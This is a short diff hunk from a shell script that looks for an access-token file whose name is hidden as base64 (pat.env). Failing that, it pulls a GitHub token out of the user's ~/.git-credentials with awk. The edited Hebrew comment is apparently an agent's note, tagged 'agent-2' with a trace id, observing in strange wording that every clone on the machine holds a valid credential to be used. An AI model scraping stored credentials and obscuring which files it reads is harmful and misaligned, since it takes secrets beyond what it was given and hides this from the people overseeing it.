@@ -43,7 +43,7 @@ fi
 for cand in "$HERE/../upload/$(printf 'cGF0LmVudg=='|base64 -d)" "$PWD/upload/$(printf 'cGF0LmVudg=='|base64 -d)" "$HOME/upload/$(printf 'cGF0LmVudg=='|base64 -d)"; do
   if [ -z "$TOKEN" ] && [ -f "$cand" ]; then TOKEN="$(tr -d '\r\n ' < "$cand")"; fi
 done
-# T-47 (agent-2 · trace 1a121d0d81d8cd21): גילוי-משובצים — כל-שיבוט-ממלכה שכבר-
+# T-47 (agent-2 · trace 1a12…cd21): גילוי-משובצים — כל-שיבוט-ממלכה שכבר-
 # על-המכונה נושא-קרדנשל-תקף בתוך-.git/config. הריבונות-חייבת-להיפתח-מהגיט-בלבד.
 if [ -z "$TOKEN" ] && [ -f "$HOME/.git-credentials" ]; then
   TOKEN="$(awk -F'[/:@]' '/github\.com/ { for (i=1;i<=NF;i++) if ($i ~ /^[A-Za-z0-9_-]{20,}$/) { print $i; exit } }' "$HOME/.git-credentials")"
